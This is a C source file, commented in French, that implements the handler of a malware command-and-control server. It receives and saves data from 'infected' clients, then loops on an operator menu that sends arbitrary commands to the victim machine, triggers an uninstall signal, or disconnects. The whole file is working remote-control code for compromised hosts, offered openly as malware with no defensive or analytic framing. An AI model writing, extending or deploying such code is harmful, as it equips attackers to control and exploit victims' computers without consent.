#include "./include/c2_server.h"
#include "./include/client_handler.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

/**
 * Gère la communication avec un client infecté.
 */
void client_handle(int client_sock) {
    char buffer[1024];

    printf("Client connecté.\n");

    // Réception des infos initiales du client
    recv(client_sock, buffer, sizeof(buffer) - 1, 0);
    save_client_data(buffer);
    printf("Données du client: %s\n", buffer);

    // Menu de gestion des commandes
    while (1) {
        int choix;
        printf("\n1. Envoyer une commande\n2. Désinstaller le malware\n3. Déconnecter\nChoix: ");
        scanf("%d", &choix);
        getchar();  // Nettoyer le buffer d'entrée

        switch (choix) {
            case 1: send_command_to_client(client_sock); break;
            case 2: uninstall_malware(client_sock); return;
            case 3: close(client_sock); return;
            default: printf("Option invalide.\n");
        }
    }
}

/**
 * Envoie une commande arbitraire au client.
 */
void send_command_to_client(int client_sock) {
    char command[256];
    printf("Commande à envoyer: ");
    fgets(command, sizeof(command), stdin);
    send(client_sock, command, strlen(command), 0);
}

/**
 * Envoie une commande de désinstallation au client.
 */
void uninstall_malware(int client_sock) {
    const char *uninstall_signal = "UNINSTALL";
    send(client_sock, uninstall_signal, strlen(uninstall_signal), 0);
    printf("Commande de désinstallation envoyée.\n");
}
